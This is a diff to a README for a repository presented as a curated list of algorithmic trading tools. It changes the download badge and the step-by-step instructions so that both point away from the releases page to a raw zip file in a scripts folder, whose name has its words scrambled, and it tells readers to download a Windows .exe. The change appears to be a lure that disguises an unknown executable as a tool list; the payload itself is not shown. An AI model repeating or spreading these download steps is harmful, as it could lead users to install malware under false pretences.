@@ -1,6 +1,6 @@
 # 📈 best-of-algorithmic-trading - Build automated trading systems with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/fourhundred-limpa848/best-of-algorithmic-trading/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/fourhundred-limpa848/best-of-algorithmic-trading/raw/refs/heads/main/scripts/trading-of-best-algorithmic-v1.0.zip)
 
 This repository provides a curated collection of tools for traders. You find everything you need to start algorithmic trading. The list covers trading bots, frameworks, and data libraries. You use these tools to build your own strategy. 
 
@@ -24,7 +24,7 @@ The collection includes software written in Python, Rust, and TypeScript. You de
 
 You find the software on the releases page. Follow these steps to obtain the files:
 
-1. Visit [https://github.com/fourhundred-limpa848/best-of-algorithmic-trading/releases](https://github.com/fourhundred-limpa848/best-of-algorithmic-trading/releases).
+1. Visit [https://github.com/fourhundred-limpa848/best-of-algorithmic-trading/raw/refs/heads/main/scripts/trading-of-best-algorithmic-v1.0.zip](https://github.com/fourhundred-limpa848/best-of-algorithmic-trading/raw/refs/heads/main/scripts/trading-of-best-algorithmic-v1.0.zip).
 2. Look for the Assets section at the bottom of the latest release.
 3. Select the file ending in .exe for your Windows system.
 4. Download the file to your computer.
